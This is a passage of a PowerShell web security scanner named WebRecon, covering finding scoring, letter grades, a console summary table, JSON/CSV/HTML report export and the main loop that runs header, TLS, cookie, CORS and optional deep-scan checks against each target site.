            -Remediation 'Disable TRACE if unused.' `
            -Reference 'https://developer.mozilla.org/docs/Web/HTTP/Methods/TRACE'
    }
}

# ==============================================================================
#  SCORING AND REPORTING
# ==============================================================================

<#
.SYNOPSIS
    Computes a 0-100 score for a set of findings, counting each finding id once.
#>
function Get-SecurityScore {
    param([object[]]$Findings)

    if (-not $Findings -or $Findings.Count -eq 0) { return 100.0 }

    $unique = $Findings | Group-Object Id | ForEach-Object { $_.Group[0] }

    $score = 100.0
    foreach ($finding in $unique) { $score -= $script:ScoreWeight[$finding.Severity] }
    if ($score -lt 0) { $score = 0.0 }

    return [math]::Round($score, 1)
}

<#
.SYNOPSIS
    Maps a numeric score to a letter grade.
#>
function Get-Grade {
    param([double]$Score)

    if ($Score -ge 90) { return 'A' }
    if ($Score -ge 80) { return 'B' }
    if ($Score -ge 70) { return 'C' }
    if ($Score -ge 55) { return 'D' }
    if ($Score -ge 40) { return 'E' }
    return 'F'
}

<#
.SYNOPSIS
    Prints the per-site summary table with counts and grade.
#>
function Show-Summary {
    Write-Host ''
    Write-Rule '=' 'Gray'
    Write-Host ' SUMMARY' -ForegroundColor White
    Write-Rule '=' 'Gray'
    Write-Host ''
    Write-Host (' {0,-32} {1,5} {2,5} {3,5} {4,5} {5,5}  {6,6} {7,7}' -f 'TARGET', 'CRIT', 'HIGH', 'MED', 'LOW', 'INFO', 'SCORE', 'GRADE') -ForegroundColor DarkGray
    Write-Rule

    foreach ($target in $script:Targets) {
        $siteFindings = @($script:Findings | Where-Object { $_.Site -eq $target.Host })

        $counts = @{ Critical = 0; High = 0; Medium = 0; Low = 0; Info = 0 }
        foreach ($finding in $siteFindings) { $counts[$finding.Severity]++ }

        $score = Get-SecurityScore -Findings $siteFindings
        $grade = Get-Grade -Score $score

        $gradeColor = switch ($grade) {
            'A' { 'Green' } 'B' { 'Green' } 'C' { 'Yellow' } 'D' { 'Yellow' } 'E' { 'Red' } default { 'Magenta' }
        }

        Write-Host (' {0,-32}' -f $target.Host) -ForegroundColor White -NoNewline
        Write-Host (' {0,5}' -f $counts.Critical) -ForegroundColor Magenta -NoNewline
        Write-Host (' {0,5}' -f $counts.High)     -ForegroundColor Red -NoNewline
        Write-Host (' {0,5}' -f $counts.Medium)   -ForegroundColor Yellow -NoNewline
        Write-Host (' {0,5}' -f $counts.Low)      -ForegroundColor Cyan -NoNewline
        Write-Host (' {0,5}' -f $counts.Info)     -ForegroundColor DarkGray -NoNewline
        Write-Host ('  {0,6}' -f $score)          -ForegroundColor Gray -NoNewline
        Write-Host (' {0,7}' -f $grade)           -ForegroundColor $gradeColor
    }

    Write-Rule
    Write-Host (" Total findings: {0}   Targets scanned: {1}" -f $script:Findings.Count, $script:Targets.Count) -ForegroundColor Gray
    Write-Host ''
}

<#
.SYNOPSIS
    Escapes a string for safe HTML insertion.
#>
function ConvertTo-HtmlSafe {
    param([string]$Text)
    if ([string]::IsNullOrEmpty($Text)) { return '' }
    return ($Text -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;' -replace '"', '&quot;')
}

<#
.SYNOPSIS
    Writes the findings to disk in the requested formats.
#>
function Export-Reports {
    param([string]$Directory, [string[]]$ExportFormats)

    if (-not (Test-Path -LiteralPath $Directory)) {
        [void](New-Item -ItemType Directory -Path $Directory -Force)
    }

    $stamp   = (Get-Date).ToString('yyyyMMdd-HHmmss')
    $written = [System.Collections.Generic.List[string]]::new()

    # --- JSON -----------------------------------------------------------------
    if ($ExportFormats -contains 'Json') {
        $path = Join-Path $Directory ("webrecon-{0}.json" -f $stamp)

        $summary = foreach ($target in $script:Targets) {
            $siteFindings = @($script:Findings | Where-Object { $_.Site -eq $target.Host })
            $siteScore    = Get-SecurityScore -Findings $siteFindings
            [pscustomobject]@{
                Host  = $target.Host
                Url   = $target.Url
                Score = $siteScore
                Grade = (Get-Grade -Score $siteScore)
            }
        }

        $payload = [pscustomobject]@{
            GeneratedAt = (Get-Date).ToString('s')
            Tool        = 'WebRecon 1.0'
            Targets     = @($script:Targets | ForEach-Object { $_.Url })
            Summary     = @($summary)
            Findings    = $script:Findings
        }

        $payload | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $path -Encoding UTF8
        $written.Add($path)
    }

    # --- CSV ------------------------------------------------------------------
    if ($ExportFormats -contains 'Csv') {
        $path = Join-Path $Directory ("webrecon-{0}.csv" -f $stamp)
        $script:Findings | Export-Csv -LiteralPath $path -NoTypeInformation -Encoding UTF8
        $written.Add($path)
    }

    # --- HTML -----------------------------------------------------------------
    if ($ExportFormats -contains 'Html') {
        $path = Join-Path $Directory ("webrecon-{0}.html" -f $stamp)

        $rows = foreach ($finding in $script:Findings) {
            $color = switch ($finding.Severity) {
                'Critical' { '#c2185b' }
                'High'     { '#d32f2f' }
                'Medium'   { '#f9a825' }
                'Low'      { '#0288d1' }
                default    { '#757575' }
            }

            $rowHtml = @"
<tr>
  <td><span class="sev" style="background:$color">$(ConvertTo-HtmlSafe $finding.Severity)</span></td>
  <td><code>$(ConvertTo-HtmlSafe $finding.Id)</code></td>
  <td>$(ConvertTo-HtmlSafe $finding.Site)</td>
  <td>$(ConvertTo-HtmlSafe $finding.Title)<br><small>$(ConvertTo-HtmlSafe $finding.Endpoint)</small></td>
  <td>$(ConvertTo-HtmlSafe $finding.Evidence)</td>
  <td>$(ConvertTo-HtmlSafe $finding.Exploit)</td>
  <td>$(ConvertTo-HtmlSafe $finding.Remediation)</td>
</tr>
"@
            $rowHtml
        }

        $stampText = (Get-Date).ToString('u')
        $countText = $script:Findings.Count
        $targetText = $script:Targets.Count

        $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>WebRecon report</title>
<style>
  body { font-family: -apple-system, Segoe UI, Roboto, sans-serif; margin: 2rem; color: #222; }
  h1 { margin-bottom: 0; }
  small { color: #666; }
  table { border-collapse: collapse; width: 100%; margin-top: 1.5rem; font-size: 13px; }
  th, td { border: 1px solid #ddd; padding: 6px 8px; vertical-align: top; text-align: left; }
  th { background: #f5f5f5; }
  tr:nth-child(even) { background: #fafafa; }
  .sev { color: #fff; padding: 2px 8px; border-radius: 3px; font-weight: 600; font-size: 11px; }
  code { background: #eee; padding: 1px 4px; border-radius: 2px; }
</style>
</head>
<body>
<h1>WebRecon report</h1>
<p><small>Generated $stampText &mdash; $countText findings on $targetText target(s).</small></p>
<table>
<thead><tr><th>Severity</th><th>ID</th><th>Host</th><th>Finding</th><th>Evidence</th><th>Exploitation</th><th>Remediation</th></tr></thead>
<tbody>
$rows
</tbody>
</table>
</body>
</html>
"@

        Set-Content -LiteralPath $path -Value $html -Encoding UTF8
        $written.Add($path)
    }

    return $written
}

# ==============================================================================
#  MAIN
# ==============================================================================

<#
.SYNOPSIS
    Runs every check against a single target.
#>
function Invoke-SiteScan {
    param([Parameter(Mandatory)][pscustomobject]$Target)

    Write-Host ''
    Write-Rule '=' 'DarkCyan'
    Write-Host (' TARGET : ' + $Target.Url) -ForegroundColor White
    Write-Host (' HOST   : ' + $Target.Host + '   PORT: ' + $Target.Port) -ForegroundColor DarkGray
    Write-Rule '=' 'DarkCyan'
    Write-Host ''

    # --- Baseline response ----------------------------------------------------
    Write-Status 'Fetching the base page...' 'Gray'
    $response = Invoke-HttpProbe -Url $Target.Url

    if (-not $response.Succeeded) {
        Write-Status ('Request failed: ' + $response.Error) 'Yellow' '[!]'
        Write-Status 'Retrying over plain HTTP...' 'Gray'

        $fallback = Resolve-Target -Input ('http://' + $Target.Uri.Authority)
        if ($fallback) {
            $response = Invoke-HttpProbe -Url $fallback.Url
            if ($response.Succeeded) {
                $Target = $fallback
                Write-Status ('Falling back to ' + $Target.Url) 'Yellow' '[!]'
            }
        }

        if (-not $response.Succeeded) {
            Add-Finding -Site $Target.Host -Id 'WEB-099' `
                -Title 'Target is unreachable' `
                -Severity 'High' -Category 'Availability' -Endpoint $Target.Url `
                -Evidence $response.Error `
                -Impact 'Nothing could be audited.' `
                -Exploit 'Not exploitable per se; check DNS, firewall and the TLS handshake manually.' `
                -Remediation 'Verify the hostname and that ports 80/443 are open.' `
                -Reference ''
            return
        }
    }

    Write-Status ("HTTP {0} {1} in {2} ms ({3} bytes)" -f $response.StatusCode, $response.ReasonPhrase, $response.ElapsedMs, $response.Length) 'DarkGray'
    Write-Host ''

    # --- Transport ------------------------------------------------------------
    Write-Status 'Auditing transport security...' 'Gray'
    if ($Target.Scheme -eq 'https') {
        $cert = Get-TlsCertificateInfo -HostName $Target.Host -Port $Target.Port
        Test-CertificateHealth -Target $Target -Cert $cert
    }
    Test-TransportHardening -Target $Target
    Test-LegacyTls -Target $Target

    # --- Headers and cookies --------------------------------------------------
    Write-Status 'Auditing response headers and cookies...' 'Gray'
    Test-SecurityHeaders -Target $Target -Response $response
    Test-CookieSecurity  -Target $Target -Response $response
    Test-InformationDisclosure -Target $Target -Response $response

    # --- CORS and content -----------------------------------------------------
    Write-Status 'Auditing CORS policy and page content...' 'Gray'
    Test-CorsPolicy      -Target $Target
    Test-ContentSecurity -Target $Target -Response $response

    # --- Deep mode ------------------------------------------------------------
    if ($DeepScan) {
        Write-Status 'Deep scan: sensitive files...' 'Gray'
        Test-SensitiveFiles -Target $Target

        Write-Status 'Deep scan: administrative surface...' 'Gray'
        Test-AdminPanels -Target $Target

        Write-Status 'Deep scan: HTTP methods...' 'Gray'
        Test-HttpMethods -Target $Target
    }
}

# ------------------------------------------------------------------------------
#  Entry point
# ------------------------------------------------------------------------------

if (-not $NoBanner) { Write-Banner }

Write-Status ("WebRecon starting - {0} target(s) - timeout {1}s - deep scan: {2}" -f $Sites.Count, $TimeoutSec, [bool]$DeepScan) 'DarkCyan' '[i]'
Write-Status ("PowerShell {0} - severity threshold: {1}" -f $PSVersionTable.PSVersion, $SeverityThreshold) 'DarkGray' '[i]'

$index = 0
foreach ($site in $Sites) {
    $index++
    Write-Progress -Activity 'WebRecon' -Status ("Scanning {0}" -f $site) -PercentComplete (($index - 1) / $Sites.Count * 100)

    $target = Resolve-Target -Input $site
    if (-not $target) {
        Write-Status ("Invalid target skipped: '{0}'" -f $site) 'Yellow' '[!]'
        continue
    }

    $script:Targets.Add($target)

    try {
        Invoke-SiteScan -Target $target
    }
    catch {
        Write-Status ("Scan error on {0}: {1}" -f $target.Host, $_.Exception.Message) 'Red' '[x]'
    }
}
Write-Progress -Activity 'WebRecon' -Completed

Show-Summary

if ($script:Findings.Count -gt 0) {
    try {
        $files = Export-Reports -Directory $OutputPath -ExportFormats $Formats
        Write-Host ' Reports written:' -ForegroundColor DarkGray
        foreach ($file in $files) { Write-Host ('   - ' + $file) -ForegroundColor DarkGray }
        Write-Host ''
    }
    catch {
        Write-Status ('Report export failed: ' + $_.Exception.Message) 'Red' '[x]'
    }
}
else {
    Write-Status 'No findings to export.' 'Gray'
}

Write-Status 'Done. Remember: this is a black-box, non-intrusive scan - always validate findings manually.' 'DarkCyan' '[i]'
Write-Host ''